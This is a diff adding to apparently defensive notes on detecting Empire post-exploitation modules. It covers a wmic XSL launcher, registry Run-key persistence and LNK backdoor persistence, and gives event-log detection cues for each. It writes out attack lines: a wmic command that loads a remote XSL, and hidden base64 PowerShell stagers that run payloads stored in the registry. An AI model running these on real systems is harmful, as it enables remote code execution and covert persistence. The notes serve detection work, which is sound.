@@ -65,6 +65,21 @@
             * Event ID 4688 - Process Creation: look for `powershell.exe` with parent as `regsvr32.exe`
         * PowerShell Event Logs same as before
         * Check launch arguments of `regsvr32.exe`
+* `windows/wmic`: Uses `wmic` to exploit the use of `XSL` files
+    * Launch
+    ```cmd
+    wmic os get /format:"<server>/<xsl file>"
+    ```
+    * Process Tree: `powershell.exe` containing agent runs as a standalone process.
+    ```cmd
+    wmic.exe -> powershell.exe
+    ```
+    * Detection:
+        * Security EVTX:
+            * Event ID 4688 - Process Creation: `powershell.exe` with parent `wmic.exe`
+            * Event ID 4688 - Process Creation: `wmic.exe`, check launch arguments which will contain xsl file.
+        * PowerShell Event Logs
+        * 
 
 ### Privilege Escalation
 * `powershell/privesc/bypassuac_env`: Bypasses UAC by modifying environmental variables in Registry.
@@ -101,3 +116,17 @@
 * `powershell/privesc/bypassuac_sdctlbypass`:
     * [https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/](https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/)
 
+### Persistence
+* `powershell/persistence/userland/registry`: Establishes persistence in Registry. Modified Keys
+    * `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater`: sets value as `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "$x=$((gp HKCU:Software\Microsoft\Windows\CurrentVersion Debug).Debug);powershell -Win Hidden -enc $x`
+    * `HKCU\Software\Microsoft\Windows\CurrentVersion\Debug`: sets base64 encoded stager logic. This is called by the script in the Updater key.
+* `powershell/persistence/userland/backdoor_lnk`: Establishes persistence through specified `lnk` file.
+    * Specified `lnk`: Detection through `LECmd` (Zimmerman tools). Executes base64 content that starts process with PowerShell code from the specified registry key
+    ```powershell
+    powershell  -w hidden -nop -enc <base64>
+    
+    Base64 decodes to
+    [System.Diagnostics.Process]::Start("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe");IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp <registry key>).debug)))
+    ```
+    * Backdoor code contained in the specified registry key. Default is `HKCU\Software\Microsoft\Windows\debug
+* 
